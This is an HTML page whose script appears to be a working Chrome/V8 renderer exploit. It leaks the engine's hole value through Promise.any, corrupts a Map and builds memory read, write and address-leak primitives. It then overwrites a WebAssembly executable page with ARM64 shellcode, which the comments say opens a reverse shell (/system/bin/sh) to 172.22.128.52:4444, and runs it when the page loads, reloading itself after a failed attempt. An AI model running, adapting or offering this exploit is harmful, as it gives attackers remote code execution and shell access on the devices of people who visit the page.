<div id="log_div"></div>
<script>

    var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128,
        128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129,
        128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97,
        105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
    ]);
    var module = new WebAssembly.Module(code);
    var instance = new WebAssembly.Instance(module);
    var wasmMain = instance.exports.main;
    new ArrayBuffer(0x10000000)
    cvt_buf = new ArrayBuffer(8);
    cvt_f64a = new Float64Array(cvt_buf);
    cvt_u64a = new BigUint64Array(cvt_buf);
    cvt_u32a = new Uint32Array(cvt_buf);


    function ftoi(f) {
        cvt_f64a[0] = f;
        return cvt_u64a[0];
    }

    function itof(i) {
        cvt_u64a[0] = i;
        return cvt_f64a[0];
    }

    function lower(i) {
        return Number(i % (2n ** 32n));
    }
    function upper(i) {
        return Number(i / (2n ** 32n));
    }
    function pair(l, h) {
        cvt_u32a[0] = l
        cvt_u32a[1] = h
        return cvt_f64a[0]
    }
    function itohalf(i) {
        return [lower(i), upper(i)]
    }


    function log(message) {
        const p = document.createElement("p");
        if (typeof message == "number" || typeof message == 'bigint')
            message = "0x" + message.toString(16)
        p.innerText = message;
        log_div = document.getElementById("log_div")
        log_div.appendChild(p);
        return p;
    }

    function trigger() {
        let v1;

        function f0(v4) {

            v4(() => { }, v5 => {

                v1 = v5.errors;

            });

        }

        f0.resolve = function (v6) {

            return v6;

        };

        let v3 = {

            then(v7, v8) {

                v8();

            }

        };

        Promise.any.call(f0, [v3]);

        var hole = (v1[1]);

        {

            var map1 = null;
            var foo_arr = null;
            function getmap(m) {
                m = new Map();
                m.set(1, 1);
                m.set(hole, 1);
                m.delete(hole);
                m.delete(hole);
                m.delete(1);
                return m;
            }
            for (let i = 0; i < 0x30; i++) {
                map1 = getmap(map1);
                foo_arr = new Array(1.1, 1.1);//1.1=3ff199999999999a

            }


            var test = new ArrayBuffer(0x1235)
            test.a = 0x11223344
            test.aa = 0x11223344
            test.aaa = 0x11223344

            var bb = new BigUint64Array(2);
            bb[0] = 0xaaaaaaaaaaaaaaaan;
            bb[1] = 0xbbbbbbbbbbbbbbbbn;

            var test2 = new ArrayBuffer(0x1236)
            test2.a = 0x11223355
            test2.aa = 0x11223355
            test2.aaa = 0x11223355

            map1.set(0x10, -1);
            map1.set(foo_arr, 0xffff);


            arrayBufferLengthIndex = 0
            arrayBufferBcPtrIndex = 0
            leakObjIndex = 0
            heapAddressIndex = 0

            for (i = 0; i < 0x100; i++) {
                ret = foo_arr[i]
                try {
                    log(BigInt(Number(i)))
                    log(ftoi(ret))
                    ret = ftoi(ret)
                    if (ret == 0x224466AA224466AAn) {
                        leakObjIndex = i
                    }
                    if (ret == 0x1236n) {
                        arrayBufferLengthIndex = i
                        arrayBufferBcPtrIndex = i + 1
                    }
                    if (ret == 0xbbbbbbbbbbbbbbbbn) {
                        heapAddressIndex = i + 6;
                    }

                    if (leakObjIndex != 0 && arrayBufferBcPtrIndex != 0 && heapAddressIndex != 0) {
                        //fetch("find")
                        break
                    }
                } catch (error) {

                }
            }


            if (leakObjIndex != 0 && arrayBufferBcPtrIndex != 0 && heapAddressIndex != 0) {


                heapAddress = ftoi(foo_arr[heapAddressIndex]) - 7n
                //fetch("heapAddress "+heapAddress.toString(16))
                //fetch("leakObjIndex "+leakObjIndex.toString(16))
                //fetch("arrayBufferBcPtrIndex "+arrayBufferBcPtrIndex.toString(16))
                arrayBufferReal = test2
                LeakReal = test2
                function addrOf(obj) {
                    LeakReal.a = obj
                    LeakReal.aa = obj
                    LeakReal.aaa = obj
                    return lower(ftoi(foo_arr[leakObjIndex]))
                }

                function read64(address) {
                    foo_arr[arrayBufferBcPtrIndex] = itof(address)
                    data = new DataView(arrayBufferReal)
                    return data.getBigUint64(0, true);
                }


                function write64(address, value) {
                    foo_arr[arrayBufferBcPtrIndex] = itof(address)
                    data = new DataView(arrayBufferReal)
                    return data.setBigUint64(0, value, true);
                }




                var instanceAddr = heapAddress + BigInt(addrOf(instance)) - 1n;

                //fetch("instanceAddr" + instanceAddr.toString(16))
                var wasmRWX = read64(instanceAddr + 0x68n);

                fetch("wasmRWX" + wasmRWX.toString(16))
                if (wasmRWX != 0n) {

                    foo_arr[arrayBufferBcPtrIndex] = itof(wasmRWX)
                    data = new DataView(arrayBufferReal)
                    


// shellCode_back = [
//     0x01, 0x00, 0x00, 0x14, 0x00, 0x00, 0x80, 0xD2,
//     0x01, 0x00, 0x82, 0xD2, 0x62, 0x00, 0x80, 0xD2,
//     0x43, 0x04, 0x80, 0xD2, 0x04, 0x00, 0x80, 0x92,
//     0x05, 0x00, 0x80, 0xD2, 0xC8, 0x1B, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0xE1, 0x03, 0x00, 0xAA,
//     0x21, 0xC0, 0x3F, 0x91, 0x00, 0x00, 0x80, 0xD2,
//     0x02, 0x00, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2,
//     0x88, 0x1B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
//     0x1F, 0x00, 0x00, 0xF1, 0x40, 0x00, 0x00, 0x54,
//     0xC0, 0x03, 0x5F, 0xD6,  //fork
//     0x40, 0x00, 0x80, 0xD2, 0x21, 0x00, 0x80, 0xD2,
//     0x02, 0x00, 0x80, 0xD2, 0xC8, 0x18, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0xE4, 0x03, 0x00, 0xAA,
//     0x01, 0x03, 0x00, 0x10, 0x02, 0x02, 0x80, 0xD2,
//     0x68, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
//     0x08, 0x03, 0x80, 0xD2, 0xE0, 0x03, 0x04, 0xAA,
//     0x01, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x04, 0xAA,
//     0x21, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x04, 0xAA,
//     0x41, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0x20, 0x01, 0x00, 0x10,
//     0xE0, 0x03, 0x00, 0xF9, 0xE1, 0x03, 0x00, 0x91,
//     0x02, 0x00, 0x80, 0xD2, 0xA8, 0x1B, 0x80, 0xD2,
//     0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x14,
//     0x02, 0x00, 0x11, 0x5C, 0xC0, 0xA8, 0x01, 0x71,
//     0x2F, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2F,
//     0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x00,
//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // reverse connect to 192.168.1.113:4444
// ];
shellCode = [
    0x01, 0x00, 0x00, 0x14, 0x00, 0x00, 0x80, 0xD2,
    0x01, 0x00, 0x82, 0xD2, 0x62, 0x00, 0x80, 0xD2,
    0x43, 0x04, 0x80, 0xD2, 0x04, 0x00, 0x80, 0x92,
    0x05, 0x00, 0x80, 0xD2, 0xC8, 0x1B, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0xE1, 0x03, 0x00, 0xAA,
    0x21, 0xC0, 0x3F, 0x91, 0x00, 0x00, 0x80, 0xD2,
    0x02, 0x00, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2,
    0x88, 0x1B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
    0x1F, 0x00, 0x00, 0xF1, 0x40, 0x00, 0x00, 0x54,
    0xC0, 0x03, 0x5F, 0xD6,  //fork
    0x40, 0x00, 0x80, 0xD2, 0x21, 0x00, 0x80, 0xD2,
    0x02, 0x00, 0x80, 0xD2, 0xC8, 0x18, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0xE4, 0x03, 0x00, 0xAA,
    0x01, 0x03, 0x00, 0x10, 0x02, 0x02, 0x80, 0xD2,
    0x68, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
    0x08, 0x03, 0x80, 0xD2, 0xE0, 0x03, 0x04, 0xAA,
    0x01, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x04, 0xAA,
    0x21, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x04, 0xAA,
    0x41, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0x20, 0x01, 0x00, 0x10,
    0xE0, 0x03, 0x00, 0xF9, 0xE1, 0x03, 0x00, 0x91,
    0x02, 0x00, 0x80, 0xD2, 0xA8, 0x1B, 0x80, 0xD2,
    0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x14,
    0x02, 0x00, 0x11, 0x5C, 0xAC, 0x16, 0x80, 0x34,
    0x2F, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2F,
    0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // reverse connect to 172.22.128.52:4444
];

                    for (let i = 0; i < shellCode.length; i++) {
                        data.setUint8(i, shellCode[i])
                    }
                    ////alert()
                    wasmMain();
                }
            }
            else {
                map1.set(0x10, 0);
                map1.set(foo_arr, 0);
                foo_arr=null
                location.reload()
            }



            return

        }

    }

    trigger();

</script>A